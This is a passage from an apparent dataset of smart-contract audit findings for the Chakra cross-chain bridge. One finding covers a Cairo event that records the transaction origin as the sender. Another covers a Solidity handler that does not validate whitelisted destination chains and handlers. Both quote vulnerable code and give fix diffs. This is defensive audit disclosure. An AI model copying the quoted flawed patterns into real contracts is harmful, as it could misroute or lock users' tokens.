//.....\n    }\n```\n\nAdditionally, when a callback message is received, the `CrossChainResult` event will show `from_address` as `get_tx_info().unbox().account_contract_address`, which is also incorrect and misleading.\n\n## Tools Used\n\n## Recommended Mitigation Steps\nFollowing modifications are recommended:\n\n```diff\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n                    from_token: self.token_address.read(),\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n            self.created_tx.write(tx_id, tx);\n            self.msg_count.write(self.msg_count.read()+1);\n            // message id = message count\n            let message_id = tx_id;\n            let transfer = ERC20Transfer{\n                method_id: 1,\n                from: contract_address_to_u256(get_caller_address()),\n                to: to,\n                from_token: contract_address_to_u256(self.token_address.read()),\n                to_token: to_token,\n                amount: amount\n            };\n\n            let message = Message{\n                version: 1,\n                message_id: message_id.into(),\n                payload_type: PayloadType::ERC20,\n                payload: encode_transfer(transfer),\n            };\n\n            // send cross chain msg\n-           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message));\n+           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message),\n+           get_caller_address());\n            // emit CrossChainLocked\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(),\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n```diff\n        fn send_cross_chain_msg(\n            ref self: ContractState, to_chain: felt252, to_handler: u256, payload_type :u8,payload: Array<u8>,\n+           from_address: felt252,\n        ) -> felt252 {\n            let from_handler = get_caller_address();\n            let from_chain = self.chain_name.read();\n            let cross_chain_settlement_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.tx_count.read());\n            self.created_tx.write(cross_chain_settlement_id, CreatedTx{\n                tx_id:cross_chain_settlement_id,\n                tx_status: CrossChainMsgStatus::PENDING,\n                from_chain: from_chain,\n                to_chain: to_chain,\n                from_handler: from_handler,\n                to_handler: to_handler\n            });\n\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n-                       from_address: get_tx_info().unbox().account_contract_address,\n+                       from_address: from_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n            self.tx_count.write(self.tx_count.read()+1);\n            return cross_chain_settlement_id;\n        }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173\n\n\n# Vulnerability details\n\n## Impact\nThe `from_address` parameter in the events emitted when sending a cross-chain message from Starknet is set to the transaction origin (`tx.origin`) instead of the actual caller (`msg.sender`). This causes incorrect data to be emitted in the event.\n\n## Proof of Concept\nWhen a cross-chain message is sent from Starknet using the function `handler_erc20::cross_chain_erc20_settlement`, the function `settlement::send_cross_chain_msg` is called:\n- See `handler_erc20::cross_chain_erc20_settlement`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L216\n- See `settlement::send_cross_chain_msg`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\nWithin this function, the `CrossChainMsg` event is emitted for validators to pick up:\n```rust\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n                        from_address: get_tx_info().unbox().account_contract_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L299\n\nThe issue is that `from_address` is set to `get_tx_info().unbox().account_contract_address`, which represents \"The account contract from which this transaction originates.\" This is equivalent to `tx.origin` in EVM-based blockchains:\nhttps://github.com/starkware-libs/cairo/blob/main/corelib/src/starknet/info.cairo#L46\n\nThis is incorrect because the address of the original transaction sender is irrelevant. Instead, `from_address` should represent the caller of the `handler_erc20::cross_chain_erc20_settlement` function.\n\nIn contrast, the EVM-based code correctly sets `from_address` to the parameter forwarded by the `ChakraSettlementHandler::cross_chain_erc20_settlement` function, which is equivalent to `msg.sender`:\n```solidity\n            // Send the cross-chain message\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L205\n```solidity\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        //.....\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L113\n\nBy using the transaction originators address (`tx.origin`) as `from_address`, the event may include an address that is irrelevant to the cross-chain transaction. This can result in misleading information for any third parties reading the events. Here are two scenarios where an incorrect `from_address` might be used:\n\nHere is the simplified rephrased version of the report:\n\n- **First Scenario:** Imagine Alice sends an NFT to Bob's contract using the `safe_transfer` function. This function makes an external call to Bob's contract. During this call, if Bob's contract calls `handler_erc20::cross_chain_erc20_settlement` to send a cross-chain message from Starknet to another chain, the `CrossChainMsg` event will show Alice's address as `from_address` because Alice was the original sender of the transaction. This is incorrect because it is actually Bob's contract sending the cross-chain message, so `from_address` should be Bob's contract address, not Alice's.\n https://github.com/OpenZeppelin/cairo-contracts/blob/main/packages/token/src/erc721/erc721.cairo#L571\n ```rust\n    // This is Bob's contract\n    // When Alice transfers NFT to Bob's contract, this function is called.\n        fn on_erc721_received(\n            self: @ComponentState<TContractState>,\n            operator: ContractAddress,\n            from: ContractAddress,\n            token_id: u256,\n            data: Span<felt252>\n        ) -> felt252 {\n            // Calling `handler_erc20::cross_chain_erc20_settlement`\n            //.....\n        }\n```\n\n- **Second Scenario:** Consider a scenario where a message is bridged from Ethereum (L1) to Starknet (L2) with Starknet validators managing the bridging process. When the message arrives on Starknet, the function marked with `#[l1_handler]` in the target contract is called by StarknetOS. **In this situation, calling `get_caller_address()` in that function returns zero.** If this function then calls `handler_erc20::cross_chain_erc20_settlement`, the `CrossChainMsg` event will show `from_address` as zero, since the original sender was StarknetOS. This is incorrect because `from_address` should be the target contract's address, not zero.\nhttps://book.cairo-lang.org/ch16-04-L1-L2-messaging.html?highlight=%23%5Bl1_handler%5D#sending-messages-from-ethereum-to-starknet\nhttps://docs.cairo-lang.org/hello_starknet/user_auth.html#getting-the-caller-address\nhttps://cairopractice.com/posts/get_caller_address_zero/\n```rust\n    // This is the target contract\n    // This function is called by StarknetOS\n    #[l1_handler]\n    fn msg_handler_felt(ref self: ContractState, from_address: felt252, my_felt: felt252) {\n        // Calling get_caller_address() here returns zero\n        // Calling `handler_erc20::cross_chain_erc20_settlement`\n        //.....\n    }\n```\n\nAdditionally, when a callback message is received, the `CrossChainResult` event will show `from_address` as `get_tx_info().unbox().account_contract_address`, which is also incorrect and misleading.\n\n## Tools Used\n\n## Recommended Mitigation Steps\nFollowing modifications are recommended:\n\n```diff\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n            \n            let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n                    from_token: self.token_address.read(),\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n            self.created_tx.write(tx_id, tx);\n            self.msg_count.write(self.msg_count.read()+1);\n            // message id = message count\n            let message_id = tx_id;\n            let transfer = ERC20Transfer{\n                method_id: 1,\n                from: contract_address_to_u256(get_caller_address()),\n                to: to,\n                from_token: contract_address_to_u256(self.token_address.read()),\n                to_token: to_token,\n                amount: amount\n            };\n\n            let message = Message{\n                version: 1,\n                message_id: message_id.into(),\n                payload_type: PayloadType::ERC20,\n                payload: encode_transfer(transfer),\n            };\n            \n            // send cross chain msg\n-           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message));\n+           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message), \n+           get_caller_address());\n            // emit CrossChainLocked\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(),\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n```diff\n        fn send_cross_chain_msg(\n            ref self: ContractState, to_chain: felt252, to_handler: u256, payload_type :u8,payload: Array<u8>,\n+           from_address: felt252,\n        ) -> felt252 {\n            let from_handler = get_caller_address();\n            let from_chain = self.chain_name.read();\n            let cross_chain_settlement_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.tx_count.read());\n            self.created_tx.write(cross_chain_settlement_id, CreatedTx{\n                tx_id:cross_chain_settlement_id,\n                tx_status: CrossChainMsgStatus::PENDING,\n                from_chain: from_chain,\n                to_chain: to_chain,\n                from_handler: from_handler,\n                to_handler: to_handler\n            });\n            \n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n-                       from_address: get_tx_info().unbox().account_contract_address,\n+                       from_address: from_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n            self.tx_count.write(self.tx_count.read()+1);\n            return cross_chain_settlement_id;\n        }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\n\n## Assessed type\n\nContext"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-044", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 44, "page_start": null, "title": "Does not check if to_chain and to_handler is whitelisted in cross_chain_erc20_settlement", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L120\n\n\n# Vulnerability details\n\n## Impact\n\nThe handler does not prevent tokens from being sent to incorrect chains and handlers. If a message is sent to an incorrect handler, the failure cannot be handled through `receive_cross_chain_callback`.\n\n## Proof of Concept\n\n`Handler.cross_chain_erc20_settlement` does not check if `to_chain` and `to_handler` are whitelisted. Therefore, it's possible to send messages to any chains and handlers that arent paired with this handler.\n\n```solidity\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n@>  require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\nIf a non-contract address is set as `to_handler`, the transaction will revert when trying to call `Handler.receive_cross_chain_msg` on the destination chain. As a result, it's impossible to emit an event to signal the failure, making failure handling impossible.\n\n```solidity\n// Settlement.receive_cross_chain_msg\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    ...\n\n@>  bool result = ISettlementHandler(to_handler).receive_cross_chain_msg( // this will be reverted\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n\n    CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n    if (result == true) {\n        status = CrossChainMsgStatus.Success;\n        receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n    } else {\n@>      receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n    }\n\n    emit CrossChainHandleResult(\n        txid,\n@>      status,\n        contract_chain_name,\n        from_chain,\n        address(to_handler),\n        from_handler,\n        payload_type\n    );\n}\n```\n\nThere's another problem. If a non-whitelisted handler requests a message, `Handler.receive_cross_chain_msg` will return `false` to indicate failure. Validators listen for the `CrossChainHandleResult` event to notify the source chain of the failure through `receive_cross_chain_callback`, allowing the handler to process the failure.\n\n```solidity\nfunction receive_cross_chain_msg(\n    uint256 /**txid */,\n    string memory from_chain,\n    uint256 /**from_address */,\n    uint256 from_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 /**sign type */,\n    bytes calldata /**signaturs */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n    ...\n}\n```\n\nHowever, `Handler.receive_cross_chain_callback` only allows callback messages from whitelisted chains and handlers. This means that when a message is sent to an incorrect handler and fails, the callback notifies of the failure, but the source chain's handler ignores and cannot handle the failure caused by the incorrect handler.\n\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n\n    require(\n        create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n        \"invalid CrossChainTxStatus\"\n    );\n\n    if (status == CrossChainMsgStatus.Success) {\n        if (mode == SettlementMode.MintBurn) {\n            _erc20_burn(address(this), create_cross_txs[txid].amount);\n        }\n\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    }\n\n    if (status == CrossChainMsgStatus.Failed) {\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n\n    return true;\n}\n```\n\nTherefore, `Handler.cross_chain_erc20_settlement` should check that `to_chain` and `to_handler` are whitelisted to prevent message transmission to incorrect handlers in the first place.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n    require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n+   require(is_valid_handler(to_chain, to_handler), \"not valid destination\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe handler does not prevent tokens from being sent to incorrect chains and handlers. If a message is sent to an incorrect handler, the failure cannot be handled through `receive_cross_chain_callback`.\n", "recommendation_md": "## Recommended Mitigation Steps\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n    require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n+   require(is_valid_handler(to_chain, to_handler), \"not valid destination\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\n\n`Handler.cross_chain_erc20_settlement` does not check if `to_chain` and `to_handler` are whitelisted. Therefore, it's possible to send messages to any chains and handlers that arent paired with this handler.\n\n```solidity\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n@>  require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\nIf a non-contract address is set as `to_handler`, the transaction will revert when trying to call `Handler.receive_cross_chain_msg` on the destination chain. As a result, it's impossible to emit an event to signal the failure, making failure handling impossible.\n\n```solidity\n// Settlement.receive_cross_chain_msg\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    ...\n\n@>  bool result = ISettlementHandler(to_handler).receive_cross_chain_msg( // this will be reverted\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n\n    CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n    if (result == true) {\n        status = CrossChainMsgStatus.Success;\n        receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n    } else {\n@>      receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n    }\n\n    emit CrossChainHandleResult(\n        txid,\n@>      status,\n        contract_chain_name,\n        from_chain,\n        address(to_handler),\n        from_handler,\n        payload_type\n    );\n}\n```\n\nThere's another problem. If a non-whitelisted handler requests a message, `Handler.receive_cross_chain_msg` will return `false` to indicate failure. Validators listen for the `CrossChainHandleResult` event to notify the source chain of the failure through `receive_cross_chain_callback`, allowing the handler to process the failure.\n\n```solidity\nfunction receive_cross_chain_msg(\n    uint256 /**txid */,\n    string memory from_chain,\n    uint256 /**from_address */,\n    uint256 from_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 /**sign type */,\n    bytes calldata /**signaturs */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n    ...\n}\n```\n\nHowever, `Handler.receive_cross_chain_callback` only allows callback messages from whitelisted chains and handlers. This means that when a message is sent to an incorrect handler and fails, the callback notifies of the failure, but the source chain's handler ignores and cannot handle the failure caused by the incorrect handler.\n\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n\n    require(\n        create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n        \"invalid CrossChainTxStatus\"\n    );\n\n    if (status == CrossChainMsgStatus.Success) {\n        if (mode == SettlementMode.MintBurn) {\n            _erc20_burn(address(this), create_cross_txs[txid].amount);\n        }\n\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    }\n\n    if (status == CrossChainMsgStatus.Failed) {\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n\n    return true;\n}\n```\n\nTherefore, `Handler.cross_chain_erc20_settlement` should check that `to_chain` and `to_handler` are whitelisted to prevent message transmission to incorrect handlers in the first place.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L120\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L120\n\n\n# Vulnerability details\n\n## Impact\n\nThe handler does not prevent tokens from being sent to incorrect chains and handlers. If a message is sent to an incorrect handler, the failure cannot be handled through `receive_cross_chain_callback`.\n\n## Proof of Concept\n\n`Handler.cross_chain_erc20_settlement` does not check if `to_chain` and `to_handler` are whitelisted. Therefore, it's possible to send messages to any chains and handlers that arent paired with this handler.\n\n```solidity\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n@>  require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        _erc20_burn(msg.sender, amount);\n    }\n    ...\n}\n```\n\nIf a non-contract address is set as `to_handler`, the transaction will revert when trying to call `Handler.receive_cross_chain_msg` on the destination chain. As a result, it's impossible to emit an event to signal the failure, making failure handling impossible.\n\n```solidity\n// Settlement.receive_cross_chain_msg\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    ...\n\n@>  bool result = ISettlementHandler(to_handler).receive_cross_chain_msg( // this will be reverted\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n\n    CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n    if (result == true) {\n        status = CrossChainMsgStatus.Success;\n        receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n    } else {\n@>      receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n    }\n\n    emit CrossChainHandleResult(\n        txid,\n@>      status,\n        contract_chain_name,\n        from_chain,\n        address(to_handler),\n        from_handler,\n        payload_type\n    );\n}\n```\n\nThere's another problem. If a non-whitelisted handler requests a message, `Handler.receive_cross_chain_msg` will return `false` to indicate failure. Validators listen for the `CrossChainHandleResult` event to notify the source chain of the failure through `receive_cross_chain_callback`, allowing the handler to process the failure.\n\n```solidity\nfunction receive_cross_chain_msg(\n    uint256 /**txid */,\n    string memory from_chain,\n    uint256 /**from_address */,\n    uint256 from_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 /**sign type */,\n    bytes calldata /**signaturs */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n    ...\n}\n```\n\nHowever, `Handler.receive_cross_chain_callback` only allows callback messages from whitelisted chains and handlers. This means that when a message is sent to an incorrect handler and fails, the callback notifies of the failure, but the source chain's handler ignores and cannot handle the failure caused by the incorrect handler.\n\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    //  from_handler need in whitelist\n@>  if (is_valid_handler(from_chain, from_handler) == false) {\n@>      return false;\n    }\n\n    require(\n        create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n        \"invalid CrossChainTxStatus\"\n    );\n\n    if (status == CrossChainMsgStatus.Success) {\n        if (mode == SettlementMode.MintBurn) {\n            _erc20_burn(address(this), create_cross_txs[txid].amount);\n        }\n\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    }\n\n    if (status == CrossChainMsgStatus.Failed) {\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n\n    return true;\n}\n```\n\nTherefore, `Handler.cross_chain_erc20_settlement` should check that `to_chain` and `to_handler` are whitelisted to prevent message transmission to incorrect handlers in the first place.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(to != 0, \"Invalid to address\");\n    require(to_handler != 0, \"Invalid to handler address\");\n    require(to_token != 0, \"Invalid to token address\");\n+   require(is_valid_handler(to_chain, to_handler), \"not valid destination\");\n\n    if (mode == SettlementMode.MintBurn) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockUnlock) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.LockMint) {\n        _erc20_lock(msg.sender, address(this), amount);\n    } else if (mode == SettlementMode.BurnUnlock) {\n        